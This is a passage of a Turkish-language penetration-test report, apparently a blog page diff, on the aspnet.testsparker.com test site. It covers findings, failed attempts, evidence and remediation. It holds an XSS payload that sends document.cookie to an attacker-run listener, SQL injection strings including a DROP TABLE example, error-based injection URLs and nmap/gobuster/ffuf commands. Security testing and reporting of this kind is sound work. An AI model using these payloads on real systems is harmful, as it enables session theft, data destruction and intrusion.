+<li><strong>Açıklama</strong>: IIS 8.5 sunucusu, 403.14 (Forbidden) hata mesajlarında kök dizin yollarını ifşa etmektedir (ör. <code>C:\Websites\aspnet.testsparker\Panel\</code>).</li>
+<li><strong>Etkilenen Bileşen</strong>: Web sunucusu (IIS 8.5)</li>
+<li><strong>Etki</strong>: Saldırganlar, sunucu dosya yapısını öğrenerek hedefe yönelik saldırılar (dosya dahil etme, dizin gezintisi) planlayabilir.</li>
+<li><strong>Kanıt</strong>: 403.14 hata mesajlarında <code>C:\Websites\aspnet.testsparker\Panel\</code> gibi yollar görülüyor.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="38-güvensiz-yönlendirmeler-düşük">3.8 Güvensiz Yönlendirmeler (Düşük)<a href="#38-güvensiz-yönlendirmeler-düşük" class="hash-link" aria-label="Direct link to 3.8 Güvensiz Yönlendirmeler (Düşük)" title="Direct link to 3.8 Güvensiz Yönlendirmeler (Düşük)">​</a></h3>
+<ul>
+<li>
+<p><strong>Açıklama</strong>: <code>/redirect.aspx</code> ve <code>/login.aspx</code> gibi sayfalar, kimlik doğrulaması olmadan yönlendirmeler yapar (<code>/default.aspx</code> veya <code>/administrator/Login.aspx</code>).</p>
+</li>
+<li>
+<p><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/redirect.aspx</code>, <code>http://aspnet.testsparker.com/login.aspx</code></p>
+</li>
+<li>
+<p><strong>Etki</strong>: Saldırganlar, yönlendirmeleri kimlik avı sitelerine veya kullanıcı navigasyonunu manipüle etmek için istismar edebilir.</p>
+</li>
+<li>
+<p><strong>Kanıt</strong>: Gobuster çıktısı:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/redirect.aspx (Status: 302) [--&gt; /default.aspx]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/login.aspx (Status: 302) [--&gt; /administrator/Login.aspx?r=/Dashboard/]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="39-whois-ve-dns-üzerinden-bilgi-toplama-bilgilendirme">3.9 WHOIS ve DNS Üzerinden Bilgi Toplama (Bilgilendirme)<a href="#39-whois-ve-dns-üzerinden-bilgi-toplama-bilgilendirme" class="hash-link" aria-label="Direct link to 3.9 WHOIS ve DNS Üzerinden Bilgi Toplama (Bilgilendirme)" title="Direct link to 3.9 WHOIS ve DNS Üzerinden Bilgi Toplama (Bilgilendirme)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: WHOIS bilgileri gizlenmiş, ancak DNS kayıtları isim sunucularını (<code>NS-122-C.GANDI.NET</code>, <code>NS-223-B.GANDI.NET</code>, <code>NS-242-A.GANDI.NET</code>) ortaya koyuyor. rDNS kaydı, sunucunun AWS üzerinde barındırıldığını gösteriyor (<code>ec2-xxx-xxx-xxx.compute-1.amazonaws.com</code>).</li>
+<li><strong>Etkilenen Bileşen</strong>: Alan adı ve sunucu meta verileri</li>
+<li><strong>Etki</strong>: Saldırganlar, bu bilgileri keşif veya hedefe yönelik saldırılar için kullanabilir.</li>
+<li><strong>Kanıt</strong>: WHOIS ve Nmap rDNS çıktısı.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="4-başarısız-olan-test-denemeleri">4. Başarısız Olan Test Denemeleri<a href="#4-başarısız-olan-test-denemeleri" class="hash-link" aria-label="Direct link to 4. Başarısız Olan Test Denemeleri" title="Direct link to 4. Başarısız Olan Test Denemeleri">​</a></h2>
+<p>Aşağıda, test sırasında gerçekleştirilen ancak güvenlik açığı tespit edilemeyen denemeler listelenmiştir. Bu testler, uygulamanın belirli alanlarda güvenli olduğunu göstermektedir, ancak sürekli izleme ve daha ileri testler önerilir.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="41-viewstate-değeri-kontrolü">4.1 Viewstate Değeri Kontrolü<a href="#41-viewstate-değeri-kontrolü" class="hash-link" aria-label="Direct link to 4.1 Viewstate Değeri Kontrolü" title="Direct link to 4.1 Viewstate Değeri Kontrolü">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: ASP.NET uygulamasında kullanılan Viewstate değerleri analiz edilmiştir. Aşağıdaki Viewstate değerleri Base64 ile decode edilerek şifre veya hassas veri içerip içermediği kontrol edilmiştir:<!-- -->
+<ul>
+<li><code>/wEPDwULLTE5OTE4NzY0OTlkZEGq7g8QSSx4n7ZaDhBOkGyN4b07NbSokTHWMKCzkWhu</code>
+<ul>
+<li><strong>Base64 Decoded</strong>: <code>b&#x27;\xff\x01\x0f\x0f\x05\x0b-1991876499ddA\xaa\xee\x0f\x10I,x\x9f\xb6Z\x0e\x10N\x90l\x8d\xe1\xbd;5\xb4\xa8\x911\xd60\xa0\xb3\x91hn&#x27;</code></li>
+</ul>
+</li>
+<li><code>/wEPDwUJMjQ5MTUxNTk1ZGR7SoZRZsldR0XCCBJ8b6HK3VNxZbwNpnWqw2kHQS3GdA==</code>
+<ul>
+<li><strong>Base64 Decoded</strong>: <code>b&#x27;\xff\x01\x0f\x0f\x05\t249151595dd{J\x86Qf\xc9]GE\xc2\x08\x12|o\xa1\xca\xddSqe\xbc\r\xa6u\xaa\xc3i\x07A-\xc6t&#x27;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Sonuç</strong>: Decode edilen verilerde şifre veya hassas bilgi tespit edilememiştir. Viewstate’in yapılandırması güvenli görünmektedir.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="42-sql-injection-denemesi-login-sayfası">4.2 SQL Injection Denemesi (Login Sayfası)<a href="#42-sql-injection-denemesi-login-sayfası" class="hash-link" aria-label="Direct link to 4.2 SQL Injection Denemesi (Login Sayfası)" title="Direct link to 4.2 SQL Injection Denemesi (Login Sayfası)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: <code>/login.aspx</code> sayfasında SQL Injection açıklarını test etmek için çeşitli payload’lar (ör. <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code>, <code>1; DROP TABLE users --</code>) denenmiştir.</li>
+<li><strong>Sonuç</strong>: Hiçbir payload başarılı olmamış ve SQL Injection açığı tespit edilememiştir. Uygulama, girişleri uygun şekilde filtreliyor veya parametreli sorgular kullanıyor gibi görünmektedir.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="43-documentcookie-çalma-denemesi-guestbooklistaspx">4.3 Document.cookie Çalma Denemesi (GuestbookList.aspx)<a href="#43-documentcookie-çalma-denemesi-guestbooklistaspx" class="hash-link" aria-label="Direct link to 4.3 Document.cookie Çalma Denemesi (GuestbookList.aspx)" title="Direct link to 4.3 Document.cookie Çalma Denemesi (GuestbookList.aspx)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: <code>http://aspnet.testsparker.com/GuestbookList.aspx</code> üzerinden document.cookie çalmak için XSS denemesi yapılmıştır. (Örnek: <code>&lt;script&gt; new Image().src = &quot;http://4.xxx.xxx.171:8000/?&quot; + document.cookie;&lt;/script&gt;</code>) Azure üzerinde bir sunucu (<code>http://4.xxx.xxx.171:8000</code>) açılmış, portlar uygun şekilde konfigüre edilmiş ve Python HTTP sunucusu ile dinlemeye geçilmiştir. Ancak, backend tarafından (frontend tarafından olmadığı anlaşıldı.) girişlerin yalnızca string olması gerektiği ve sembollerin kullanılamayacağına dair hata mesajı alınmıştır: <code>Please, post only strings (you cannot use only digits) and don&#x27;t use: #,$,-,&#x27;,&quot;^,+,{,}.</code></li>
+<li><strong>Sonu ç</strong>: Giriş doğrulama kısıtlamaları nedeniyle document.cookie çalma denemesi başarısız olmuştur. Bu, uygulamanın belirli XSS saldırılarına karşı koruma sağladığını gösterir.</li>
+<li><strong>Öneri</strong>: Mevcut giriş doğrulama mekanizmalarını koruyun ve tüm kullanıcı girişlerini denetleyin. Ayrıca, Content Security Policy (CSP) ve HttpOnly cookie bayraklarını kullanarak XSS saldırılarına karşı ek koruma sağlayın.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="5-kanıtlar-ve-ekran-görüntüleri">5. Kanıtlar ve Ekran Görüntüleri<a href="#5-kanıtlar-ve-ekran-görüntüleri" class="hash-link" aria-label="Direct link to 5. Kanıtlar ve Ekran Görüntüleri" title="Direct link to 5. Kanıtlar ve Ekran Görüntüleri">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="51-stored-xss-in-guestbook">5.1 Stored XSS in Guestbook<a href="#51-stored-xss-in-guestbook" class="hash-link" aria-label="Direct link to 5.1 Stored XSS in Guestbook" title="Direct link to 5.1 Stored XSS in Guestbook">​</a></h3>
+<ul>
+<li><strong>Payload</strong>: <code>&lt;svg&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/svg&gt;</code></li>
+<li><strong>Sonuç</strong>: <code>http://aspnet.testsparker.com/guestbook.aspx</code> ziyaret edildiğinde JavaScript uyarısı çalışır.</li>
+<li><strong>Ekran Görüntüsü</strong>:</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="Stored XSS Kanıtı" src="/b-log/assets/images/2-a3bcbbc69c4372ae04bf03cda6d00840.png" width="770" height="173" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="52-error-based-sql-injection">5.2 Error-Based SQL Injection<a href="#52-error-based-sql-injection" class="hash-link" aria-label="Direct link to 5.2 Error-Based SQL Injection" title="Direct link to 5.2 Error-Based SQL Injection">​</a></h3>
+<ul>
+<li><strong>URL ve Payload’lar</strong>:<!-- -->
+<ul>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=asd</code> → <code>Invalid column name &#x27;asd&#x27;.</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=user</code> → <code>Conversion failed when converting the nvarchar value &#x27;dbo&#x27; to data type int.</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=2&#x27; OR 1=1--</code> → <code>Incorrect syntax near &#x27;1&#x27;.</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=4&#x27;+convert(int,(SELECT @@version))--</code> → <code>Incorrect syntax near the keyword &#x27;convert&#x27;. Incorrect syntax near &#x27;)&#x27;.</code></li>
+<li><strong>Ekran Görüntüsü</strong>:</li>
+</ul>
+</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="SQL Injection" src="/b-log/assets/images/4-0ca7590d8d440ed6199a68a8b4443e60.png" width="595" height="124" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="53-hassas-dosya-i̇fşası---yapılandırma-dosyası">5.3 Hassas Dosya İfşası - Yapılandırma Dosyası<a href="#53-hassas-dosya-i̇fşası---yapılandırma-dosyası" class="hash-link" aria-label="Direct link to 5.3 Hassas Dosya İfşası - Yapılandırma Dosyası" title="Direct link to 5.3 Hassas Dosya İfşası - Yapılandırma Dosyası">​</a></h3>
+<ul>
+<li>
+<p><strong>URL</strong>: <code>http://aspnet.testsparker.com/statics/help-yes.html</code></p>
+</li>
+<li>
+<p><strong>İçerik</strong>:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [ResponseResult] ResultCode=0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="54-hassas-dosya-i̇fşası---veritabanı-dosyası">5.4 Hassas Dosya İfşası - Veritabanı Dosyası<a href="#54-hassas-dosya-i̇fşası---veritabanı-dosyası" class="hash-link" aria-label="Direct link to 5.4 Hassas Dosya İfşası - Veritabanı Dosyası" title="Direct link to 5.4 Hassas Dosya İfşası - Veritabanı Dosyası">​</a></h3>
+<ul>
+<li>
+<p><strong>URL</strong>: <code>http://aspnet.testsparker.com/statics/data.mdb</code></p>
+</li>
+<li>
+<p><strong>İçerik</strong>: <code>strings data.mdb</code> komutuyla elde edilen çıktı:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Standard Jet DB</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gr@?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">y[S)|*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mustafa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="55-iis-85-dizin-i̇fşası">5.5 IIS 8.5 Dizin İfşası<a href="#55-iis-85-dizin-i̇fşası" class="hash-link" aria-label="Direct link to 5.5 IIS 8.5 Dizin İfşası" title="Direct link to 5.5 IIS 8.5 Dizin İfşası">​</a></h3>
+<ul>
+<li><strong>Hata Mesajı</strong>: 403.14 hata mesajlarında <code>C:\Websites\aspnet.testsparker\Panel\</code> gibi yollar görülüyor.</li>
+<li><strong>Ekran Görüntüsü</strong>:</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="ISS85" src="/b-log/assets/images/5-f2bb749bc675afe64c20eaba5fb29d13.png" width="322" height="97" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="56-nmap-tarama-sonuçları">5.6 Nmap Tarama Sonuçları<a href="#56-nmap-tarama-sonuçları" class="hash-link" aria-label="Direct link to 5.6 Nmap Tarama Sonuçları" title="Direct link to 5.6 Nmap Tarama Sonuçları">​</a></h3>
+<ul>
+<li>
+<p><strong>Komut</strong>: <code>nmap -sV -T4 aspnet.testsparker.com</code></p>
+</li>
+<li>
+<p><strong>Çıktı</strong>:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT    STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">443/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="57-gobuster-sonuçları">5.7 Gobuster Sonuçları<a href="#57-gobuster-sonuçları" class="hash-link" aria-label="Direct link to 5.7 Gobuster Sonuçları" title="Direct link to 5.7 Gobuster Sonuçları">​</a></h3>
+<ul>
+<li><strong>Komut</strong>: <code>gobuster dir -u http://aspnet.testsparker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,bak,config,txt</code></li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="58-ffuf-sonuçları">5.8 Ffuf Sonuçları<a href="#58-ffuf-sonuçları" class="hash-link" aria-label="Direct link to 5.8 Ffuf Sonuçları" title="Direct link to 5.8 Ffuf Sonuçları">​</a></h3>
+<ul>
+<li><strong>Komut</strong>: <code>ffuf -u http://aspnet.testsparker.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .aspx -fc 403,404 -t 50 </code></li>
+<li><strong>Çıktı</strong>:<!-- -->
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">help.aspx               [Status: 200, Size: 3031, Words: 725, Lines: 72, Duration: 147ms]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shop.aspx               [Status: 200, Size: 5806, Words: 2040, Lines: 109, Duration: 157ms]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">about.aspx              [Status: 200, Size: 7599, Words: 1751, Lines: 177, Duration: 158ms]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Login.aspx              [Status: 302, Size: 156, Words: 6, Lines: 4, Duration: 158ms]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">products.aspx           [Status: 200, Size: 3726, Words: 856, Lines: 84, Duration: 148ms]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="6-etkiler-ve-öneriler">6. Etkiler ve Öneriler<a href="#6-etkiler-ve-öneriler" class="hash-link" aria-label="Direct link to 6. Etkiler ve Öneriler" title="Direct link to 6. Etkiler ve Öneriler">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="61-ssltls-eksikliği">6.1 SSL/TLS Eksikliği<a href="#61-ssltls-eksikliği" class="hash-link" aria-label="Direct link to 6.1 SSL/TLS Eksikliği" title="Direct link to 6.1 SSL/TLS Eksikliği">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Veriye müdahale, kullanıcı güveninin kaybı ve olası uyumsuzluklar.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>Geçerli bir sertifika (ücretsiz olarak Let’s Encrypt) kullanarak SSL/TLS uygulanabilir.</li>
+<li>HSTS ile HTTPS yönlendirmesini zorunlu kılın.</li>
+<li>HTTP erişimini devre dışı bırakmak için sunucu yapılandırmasını güncelleyin.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="62-stored-xss-in-guestbook">6.2 Stored XSS in Guestbook<a href="#62-stored-xss-in-guestbook" class="hash-link" aria-label="Direct link to 6.2 Stored XSS in Guestbook" title="Direct link to 6.2 Stored XSS in Guestbook">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Kullanıcı hesaplarının ele geçirilmesi, veri hırsızlığı ve web sitesi tahribatı.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>Tüm kullanıcı girişleri için giriş doğrulama uygulayın.</li>
+<li>Komut dosyası yürütmesini kısıtlamak için Content Security Policy (CSP) kullanın.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="63-error-based-sql-injection">6.3 Error-Based SQL Injection<a href="#63-error-based-sql-injection" class="hash-link" aria-label="Direct link to 6.3 Error-Based SQL Injection" title="Direct link to 6.3 Error-Based SQL Injection">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Veritabanından hassas veri sızıntısı, veri manipülasyonu veya yetkisiz erişim.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>Parametreli sorgular veya hazırlanmış ifadeler (prepared statements) kullanarak SQL Injection’ı önleyin.</li>
+<li>Kullanıcı girişlerini uygun şekilde filtreleyin ve doğrulayın.</li>
+<li>Hata mesajlarını özelleştirerek veritabanı yapısı hakkında bilgi sızmasını engelleyin.</li>
+<li>Web Application Firewall (WAF) kullanarak SQL Injection saldırılarını tespit edin ve engelleyin.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="64-hassas-bilgi-i̇fşası---yapılandırma-dosyası">6.4 Hassas Bilgi İfşası - Yapılandırma Dosyası<a href="#64-hassas-bilgi-i̇fşası---yapılandırma-dosyası" class="hash-link" aria-label="Direct link to 6.4 Hassas Bilgi İfşası - Yapılandırma Dosyası" title="Direct link to 6.4 Hassas Bilgi İfşası - Yapılandırma Dosyası">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: E-posta yapılandırmalarının ifşası, hedefe yönelik saldırılara yol açabilir.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li><code>/statics/</code> dizinine erişimi <code>webconfig</code> veya eşdeğeri ile kısıtlayın.</li>
+<li>Hassas dosyaları herkese açık dizinlerden kaldırın veya taşıyın.</li>
+<li>Tüm dizinleri istenmeyen dosya ifşası için denetleyin.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="65-hassas-bilgi-i̇fşası---veritabanı-dosyası">6.5 Hassas Bilgi İfşası - Veritabanı Dosyası<a href="#65-hassas-bilgi-i̇fşası---veritabanı-dosyası" class="hash-link" aria-label="Direct link to 6.5 Hassas Bilgi İfşası - Veritabanı Dosyası" title="Direct link to 6.5 Hassas Bilgi İfşası - Veritabanı Dosyası">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Potansiyel kullanıcı adları veya parolaların ifşası, kimlik doğrulama sistemlerine yönelik saldırıları kolaylaştırabilir.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li><code>data.mdb</code> dosyasını hemen <code>/statics/</code> dizininden kaldırın veya erişimini kısıtlayın.</li>
+<li>Veritabanı dosyalarını yalnızca güvenli, erişim kontrollü ortamlarda saklayın.</li>
+<li>İfşa edilen verilerin (örn. <code>mustafa</code>) hala kullanılıp kullanılmadığını kontrol edin ve gerekirse kimlik bilgilerini güncelleyin.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="66-iis-85-hata-mesajı-ile-dizin-i̇fşası">6.6 IIS 8.5 Hata Mesajı ile Dizin İfşası<a href="#66-iis-85-hata-mesajı-ile-dizin-i̇fşası" class="hash-link" aria-label="Direct link to 6.6 IIS 8.5 Hata Mesajı ile Dizin İfşası" title="Direct link to 6.6 IIS 8.5 Hata Mesajı ile Dizin İfşası">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Sunucu dosya yapısının ifşası, hedefe yönelik saldırıları kolaylaştırabilir.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>IIS hata mesajlarını özelleştirerek dosya yollarının ifşa edilmesini önleyin (<code>Custom Errors</code> yapılandırması).</li>
+<li>Sunucu yapılandırmasını gözden geçirerek dizin indekslemeyi devre dışı bırakın.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="67-oturum-açma-ve-diğer-girdi-noktaları-yönlendirmeler">6.7 Oturum Açma ve Diğer Girdi Noktaları, Yönlendirmeler<a href="#67-oturum-açma-ve-diğer-girdi-noktaları-yönlendirmeler" class="hash-link" aria-label="Direct link to 6.7 Oturum Açma ve Diğer Girdi Noktaları, Yönlendirmeler" title="Direct link to 6.7 Oturum Açma ve Diğer Girdi Noktaları, Yönlendirmeler">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Yönetimsel arayüzlere yetkisiz erişim riski artar.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>Güçlü parola politikaları ve çok faktörlü kimlik doğrulama (MFA) uygulayın.</li>
+<li>Kaba kuvvet saldırılarına karşı oturum açma denemelerini izleyin ve IP, süre, tekrar etme durumlarına göre sınırlayın.</li>
+<li>Yetkisiz yönlendirmeleri önlemek için uygun oturum yönetimi uygulayın.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="68-korunmasız-dizin-statics">6.8 Korunmasız Dizin (<code>/statics/</code>)<a href="#68-korunmasız-dizin-statics" class="hash-link" aria-label="Direct link to 68-korunmasız-dizin-statics" title="Direct link to 68-korunmasız-dizin-statics">​</a></h3>
+<ul>
+<li><strong>Etki</strong>: Yetkisiz kullanıcılara hassas kaynakların ifşası.</li>
+<li><strong>Öneriler</strong>:<!-- -->
+<ul>
+<li>Dizin indeksleme kontrolleri ile <code>/statics/</code> erişimini reddedecek şekilde sunucuyu yapılandırın.</li>
+<li>Yetkisiz dizin erişimini kısıtlamak için uygun oturum yönetimi uygulayın.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="not">Not<a href="#not" class="hash-link" aria-label="Direct link to Not" title="Direct link to Not">​</a></h3>
+<ul>
+<li><strong>TestCookie</strong>: Sayfa üzerinde belli bir süre bulunduktan sonra TestCookie<!-- -->:Hello<!-- --> şeklinde bir cookie daha ekleniyor.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="7-genel-değerlendirme-ve-sonuç">7. Genel Değerlendirme ve Sonuç<a href="#7-genel-değerlendirme-ve-sonuç" class="hash-link" aria-label="Direct link to 7. Genel Değerlendirme ve Sonuç" title="Direct link to 7. Genel Değerlendirme ve Sonuç">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="71-genel-güvenlik-durumu">7.1 Genel Güvenlik Durumu<a href="#71-genel-güvenlik-durumu" class="hash-link" aria-label="Direct link to 7.1 Genel Güvenlik Durumu" title="Direct link to 7.1 Genel Güvenlik Durumu">​</a></h3>
